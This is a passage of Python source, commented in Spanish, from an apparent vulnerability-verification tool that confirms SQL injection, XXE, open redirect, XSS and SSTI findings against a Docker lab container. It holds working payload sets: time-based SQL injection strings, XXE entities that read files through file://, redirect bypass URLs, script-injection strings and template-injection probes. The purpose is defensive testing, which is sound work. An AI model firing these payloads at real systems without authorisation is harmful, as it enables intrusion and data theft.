    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
        orig_value = str(base_params.get(sqli_param) or "1")

        def timed_send(val) -> Optional[float]:
            payload = dict(base_params)
            payload[sqli_param] = val
            t0 = time.time()
            try:
                _http_request(m, base_url + endpoint, timeout=_SQLI_SLEEP_SECONDS + 15,
                                 data=payload if m != "GET" else None,
                                 params=payload if m == "GET" else None)
            except Exception:
                return None
            return time.time() - t0

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "sqli_param": sqli_param})

        step("midiendo tiempos de respuesta de control (sin inyeccion)...")
        base_times = [t for t in (timed_send(orig_value), timed_send(orig_value)) if t is not None]
        if not base_times:
            res.detail = "las peticiones de control fallaron (sin tiempo base con el que comparar)"
            return res
        base_times.sort()
        base_median = base_times[len(base_times) // 2]
        res.evidence["tiempo_base_mediana_s"] = round(base_median, 2)

        threshold = base_median + (_SQLI_SLEEP_SECONDS / 2)
        tried = []
        found = False
        for ctx in _SQLI_CONTEXTS:
            if found:
                break
            for sleep_expr in _SQLI_SLEEP_EXPRS:
                if found:
                    break
                for cm in _SQLI_COMMENTS:
                    payload_val = f"{orig_value}{ctx} AND {sleep_expr}{cm}"
                    step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (time-based)...")
                    t1 = timed_send(payload_val)
                    t2 = timed_send(payload_val)
                    entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
                             "tiempo_2_s": round(t2, 2) if t2 else None}
                    tried.append(entry)
                    if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                        found = True
                        res.evidence["payload_ganador"] = payload_val
                        res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                        res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                        step(f"VERIFICADO: {sqli_param}={payload_val!r} retraso la respuesta "
                             f"~{round((t1+t2)/2, 1)}s de forma CONSISTENTE en 2 repeticiones "
                             f"independientes (linea base {round(base_median, 1)}s) -- SQLi ciega "
                             f"por tiempo, no ruido de red/Docker.")
                        break

        # MSSQL: WAITFOR DELAY es una INSTRUCCION, no una funcion que valga dentro de un AND/OR --
        # necesita una query APILADA (';' cierra el SELECT original y abre una nueva). Casuistica
        # real de SQL Injection/Intruder/Generic_TimeBased.txt en PayloadsAllTheThings. Se prueba
        # aparte porque su forma no encaja en el bucle de arriba (SLEEP()/pg_sleep() si valen
        # dentro de una condicion AND/OR).
        if not found:
            waitfor_secs = f"0:0:{_SQLI_SLEEP_SECONDS:.0f}"
            for ctx in ("", "'", "')", '")'):
                if found:
                    break
                payload_val = f"{orig_value}{ctx};WAITFOR DELAY '{waitfor_secs}'--"
                step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (MSSQL WAITFOR, "
                     f"time-based)...")
                t1 = timed_send(payload_val)
                t2 = timed_send(payload_val)
                entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
                         "tiempo_2_s": round(t2, 2) if t2 else None}
                tried.append(entry)
                if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                    found = True
                    res.evidence["payload_ganador"] = payload_val
                    res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                    res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                    step(f"VERIFICADO (MSSQL WAITFOR): {sqli_param}={payload_val!r} retraso la "
                         f"respuesta de forma CONSISTENTE en 2 repeticiones independientes.")

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SQLI CIEGA POR TIEMPO confirmada: {sqli_param}="
                          f"{res.evidence['payload_ganador']!r} retraso la respuesta de forma "
                          f"consistente en 2 peticiones independientes, por encima de la linea "
                          f"base + la mitad del retraso pedido -- no es ruido de red/Docker")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} combinaciones de contexto/dialecto de "
                          f"SLEEP y ninguna retraso la respuesta de forma consistente -- la SQLi "
                          f"ciega por tiempo no se confirmo (puede que el endpoint/parametro no "
                          f"sean los reales, que el motor no soporte ninguno de los dialectos "
                          f"probados, o que de verdad no haya inyeccion)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_xxe(
    source_dir: str, endpoint: str, http_method: str, parameters,
    xml_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_xxe: planta un canario dentro del contenedor real
    del objetivo y prueba las mismas variantes de entidad externa (DOCTYPE normal, parametro-
    entidad, envuelta en SOAP) como parametro de formulario y como cuerpo crudo
    (application/xml, text/xml). Si ninguna devuelve el secreto en banda, cae al mismo fallback
    OOB/ciego via el listener interno que SSRF -- el mecanismo (parser XML resolviendo
    file://, o una URL externa) no depende del stack que procese el XML."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    xml_param = xml_param_hint or _pick_param(parameters, _XML_HINTS)

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"contenedor del objetivo)...")
        if not lab.write_canary(container, canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res

        xxe_general = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                       f'"file://{canary_path}">]><foo>&xxe;</foo>')
        xxe_param_entity = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
                           f'"file://{canary_path}"> %xxe; ]><foo>test</foo>')
        xxe_soap = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                   f'"file://{canary_path}">]><soap:Envelope '
                   f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
                   f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
        xml_variants = [("entidad general (DOCTYPE normal)", xxe_general),
                        ("parametro-entidad", xxe_param_entity),
                        ("envuelta en SOAP", xxe_soap)]

        m = (http_method or "GET").upper()
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "xml_param": xml_param or "(cuerpo crudo)",
                             "canary_path": canary_path, "canary_secret": secret})

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            try:
                resp = _http_request(m, base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            present = secret in (resp.text or "")
            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta ({label}).")

        for label, xml_body in xml_variants:
            if found:
                break
            if xml_param:
                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
                payload[xml_param] = xml_body
                try_send(f"{label}, parametro de formulario",
                         data=payload if m != "GET" else None,
                         params=payload if m == "GET" else None)
            if not found:
                try_send(f"{label}, cuerpo crudo application/xml", data=xml_body.encode(),
                         headers={"Content-Type": "application/xml"})
            if not found:
                try_send(f"{label}, cuerpo crudo text/xml", data=xml_body.encode(),
                         headers={"Content-Type": "text/xml"})

        res.evidence["intentos"] = tried

        if not found:
            step("ninguna variante en banda devolvio el secreto; probando XXE ciego/OOB via el "
                 "listener interno...")
            listener = lab.start_listener()
            if listener:
                oob_token = _token()
                oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                          f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
                          f'<foo>&xxe;</foo>')
                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
                try:
                    if xml_param:
                        payload[xml_param] = oob_xml
                        _http_request(m, base_url + endpoint, timeout=20,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None)
                    else:
                        _http_request(m, base_url + endpoint, data=oob_xml.encode(),
                                        headers={"Content-Type": "application/xml"}, timeout=20)
                except Exception:
                    pass
                time.sleep(2)
                oob_log = lab.listener_log()
                oob_hit = oob_token in oob_log
                res.evidence["oob_intento"] = {"token": oob_token, "hit": oob_hit}
                if oob_hit:
                    found = True
                    res.evidence["tecnica"] = "oob-blind"
                    res.evidence["modo_ganador"] = "OOB via listener interno"

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "oob-blind":
                res.detail = ("XXE ciego/OOB confirmado: el parser XML intento resolver una "
                              "entidad externa apuntando a un listener interno (inalcanzable "
                              "desde fuera del laboratorio), y la conexion llego con el token "
                              "exacto -- prueba de que el parser resuelve entidades externas "
                              "arbitrarias, aunque no se extrajo el contenido del fichero")
            else:
                res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
                              f"contiene el secreto exacto plantado en {canary_path} -- el "
                              f"parser XML resolvio una entidad externa apuntando al sistema de "
                              f"ficheros real")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa (en "
                          f"banda) y el intento OOB via listener interno, y ninguna confirmo "
                          f"nada -- el XXE no se confirmo (puede que el parser tenga las "
                          f"entidades externas desactivadas, o el endpoint/parametro no son los "
                          f"reales)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_open_redirect(
    source_dir: str, endpoint: str, http_method: str, parameters,
    redirect_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_open_redirect: manda la misma bateria de variantes de
    URL externa/bypass (directa, protocol-relative, backslash, userinfo, espacios/tabs,
    subdominio del host confiable) con allow_redirects=False, y solo marca verificado si la
    respuesta es un 3xx con Location conteniendo el dominio externo exacto -- el mecanismo de
    prueba (inspeccionar la cabecera Location real) no depende del stack."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    redirect_param = redirect_param_hint or _pick_param(parameters, _REDIRECT_HINTS)
    if not redirect_param:
        res.detail = "no se identifico el parametro que lleva la URL de destino"
        res.limitations.append("la verificacion de open redirect necesita saber que parametro "
                               "lleva la URL de destino; afina 'parameters' o pasalo a mano "
                               "(redirect_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        token = _token()
        evil_host = f"binoracle-lab-redirect-{token}.invalid"
        targets = [
            f"https://{evil_host}/pwned",
            f"//{evil_host}/pwned",
            f"https:/\\{evil_host}/pwned",
            f"https:\\\\{evil_host}\\pwned",
            f"https://trusted.example.com@{evil_host}/pwned",
            f"https://{evil_host}\\@trusted.example.com/pwned",
            f" https://{evil_host}/pwned",
            f"\thttps://{evil_host}/pwned",
            f"https://{evil_host}#@trusted.example.com/",
            f"https://trusted.example.com.{evil_host}/pwned",
            # triple/cuadruple slash y slash inicial delante de URL absoluta -- casuistica real
            # de Open Redirect/Intruder/Open-Redirect-payloads.txt en PayloadsAllTheThings.
            f"///{evil_host}/pwned", f"////{evil_host}/pwned",
            f"/https://{evil_host}/pwned",
        ]
        # ademas de las anteriores, las ~155 variantes generalizables de las 3 wordlists de Open
        # Redirect en PayloadsAllTheThings (ver payload_kb.load_open_redirect_templates).
        targets += load_open_redirect_templates(evil_host)
        m = (http_method or "GET").upper()
        tried = []
        confirmed_entry = None
        for target in targets:
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[redirect_param] = target
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None,
                                        allow_redirects=False)
            except Exception as e:
                tried.append({"target": target, "error": str(e)})
                continue
            location = resp.headers.get("Location", "")
            is_redirect = resp.status_code in (301, 302, 303, 307, 308)
            confirmed = is_redirect and _redirect_location_is_external(location, evil_host)
            tried.append({"target": target, "status": resp.status_code, "location": location,
                         "confirmado": confirmed})
            if confirmed:
                confirmed_entry = tried[-1]
                break
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "redirect_param": redirect_param, "dominio_externo_esperado": evil_host,
                             "metodo": m, "intentos": tried})

        if confirmed_entry:
            res.verified = True
            res.ok = True
            res.evidence["status_code_respuesta"] = confirmed_entry["status"]
            res.evidence["location_recibida"] = confirmed_entry["location"]
            res.evidence["url_externa_ganadora"] = confirmed_entry["target"]
            res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
                          f"{confirmed_entry['target']!r} produjo un {confirmed_entry['status']} "
                          f"con Location={confirmed_entry['location']!r} -- el servidor redirige "
                          f"de verdad a un dominio externo controlado por el atacante")
            step(f"VERIFICADO: Location={confirmed_entry['location']!r} contiene el dominio "
                 f"externo enviado.")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de bypass (directa, "
                          f"protocol-relative, backslash, userinfo, espacios/tabs, subdominio) "
                          f"para {redirect_param} y ninguna produjo un redirect con "
                          f"'{evil_host}' en Location -- el open redirect no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_xss(
    source_dir: str, endpoint: str, http_method: str, parameters,
    xss_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_xss: carga la respuesta en un Chromium headless REAL
    (ver _xss_render) y prueba la misma bateria de variantes elegidas a mano (rotura de HTML/
    atributo/contexto JS-string/URI) MAS las ~500 variantes generalizables de
    xss_alert_identifiable.txt en PayloadsAllTheThings -- solo se marca verificado si
    document.title cambia EXACTO al marcador, prueba de ejecucion real de JS, no de que el
    payload simplemente aparezca en el HTML crudo de la respuesta."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    xss_param = xss_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not xss_param:
        res.detail = "no se identifico el parametro donde se refleja el payload"
        res.limitations.append("la verificacion de XSS necesita saber que parametro se refleja; "
                               "afina 'parameters' o pasalo a mano (xss_param_hint)")
        return res

    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except Exception:
        res.available = False
        res.detail = ("Playwright no esta instalado: la verificacion de XSS necesita un "
                     "navegador real para confirmar EJECUCION, no basta ver el payload "
                     "reflejado en el HTML crudo")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        token = _token()
        marker = f"binoracle-xss-{token}"
        js = f"document.title='{marker}'"
        attempts = [
            f"<script>{js}</script>",
            f"<img src=x onerror=\"{js}\">",
            f"<svg onload=\"{js}\">",
            f"<body onload=\"{js}\">",
            f"<iframe src=\"javascript:{js}\"></iframe>",
            f"<details open ontoggle=\"{js}\">x</details>",
            f"\"><script>{js}</script>",
            f"'><script>{js}</script>",
            f"\" onmouseover=\"{js}\" x=\"",
            f"' onmouseover='{js}' x='",
            f"';{js};//", f'";{js};//',
            f"</script><script>{js}</script>",
            f"javascript:{js}",
            f"<ScRiPt>{js}</sCrIpT>",
            f"<svg/onload=\"{js}\">",
        ]
        attempts += load_xss_payloads(js)

        m = (http_method or "GET").upper()
        found = False
        tried = []
        # UN SOLO navegador para los ~500+ intentos (ver _XssBrowserSession): arrancar un
        # Chromium por payload, confirmado en vivo, tarda minutos -- el coste real es el
        # arranque del propio navegador, no la navegacion entre paginas.
        step(f"arrancando Chromium headless (se reutiliza para los {len(attempts)} intentos)...")
        with _XssBrowserSession() as xb:
            for payload_value in attempts:
                params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
                params[xss_param] = payload_value
                title, _ = xb.render(base_url, endpoint, m, params, [])
                tried.append({"payload": payload_value, "title_resultante": title})
                if title == marker:
                    found = True
                    res.evidence["payload_ganador"] = payload_value
                    step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
                         f"cambio exactamente a '{marker}'.")
                    break
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "xss_param": xss_param, "token": token, "metodo": m,
                             "intentos_count": len(tried)})
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"XSS confirmado: el navegador real EJECUTO el script inyectado en "
                          f"{xss_param} -- document.title cambio exactamente a '{marker}', algo "
                          f"que solo el motor JS del navegador pudo hacer, no una coincidencia de "
                          f"texto reflejado")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de XSS para {xss_param} y en "
                          f"ninguna el navegador ejecuto el script -- el XSS no se confirmo "
                          f"(puede que el contexto de reflexion sea distinto, que haya "
                          f"sanitizacion real, o que el efecto solo se vea en otra pagina)")
        res.evidence["intentos"] = tried[:50]
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_ssti(
    source_dir: str, endpoint: str, http_method: str, parameters,
    ssti_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_ssti: el payload pide al motor de plantillas que
    CALCULE una operacion aritmetica con dos numeros aleatorios; si el resultado (que no aparece
    en ningun punto del payload enviado) sale en la respuesta, es prueba de que el motor EVALUO
    codigo, no que lo reflejo como texto. Incluye las plantillas elegidas a mano MAS todas las
    generalizables de ssti.fuzz en PayloadsAllTheThings."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    ssti_param = ssti_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not ssti_param:
        res.detail = "no se identifico el parametro que llega al motor de plantillas"
        res.limitations.append("la verificacion de SSTI necesita saber que parametro llega a la "
                               "plantilla; afina 'parameters' o pasalo a mano (ssti_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
        expected = a * b
        mul = f"{a}*{b}"
        hand_made = [
            f"{{{{{mul}}}}}", f"${{{mul}}}", f"#{{{mul}}}", f"<%= {mul} %>",
            f"{{{mul}}}", f"${{{{{mul}}}}}", f"<#if true>${{{mul}}}</#if>",
            f"}}{{{mul}}}{{", f"'}}{{{mul}}}{{'", f'"}}{{{mul}}}{{"',
            f"-}}{{{mul}}}{{-", f"\">{{{{{mul}}}}}<\"",
        ]
        attempt_pairs = [(p, expected) for p in hand_made] + load_ssti_arithmetic_payloads(a, b)

        m = (http_method or "GET").upper()
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "ssti_param": ssti_param, "a": a, "b": b,
                             "producto_esperado": expected})

        found = False
        tried = []
        for payload_value, payload_expected in attempt_pairs:
            pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[ssti_param] = payload_value
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            matched = bool(pattern.search(resp.text or ""))
            tried.append({"payload": payload_value, "status": resp.status_code,
                         "resultado_presente": matched})
            if matched:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["resultado_esperado_ganador"] = payload_expected
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
                     f"motor de plantillas -- ese numero no aparece en el payload enviado.")
                break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SSTI confirmada: la peticion con {ssti_param}="
                          f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
                          f"EVALUARA la expresion y devolviera "
                          f"{res.evidence['resultado_esperado_ganador']} en la respuesta -- "
                          f"prueba inequivoca de evaluacion de codigo en servidor")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} "
                          f"(producto esperado {a}*{b}={expected}, mas las plantillas aditivas) y "
                          f"ninguna produjo el resultado esperado -- el SSTI no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()
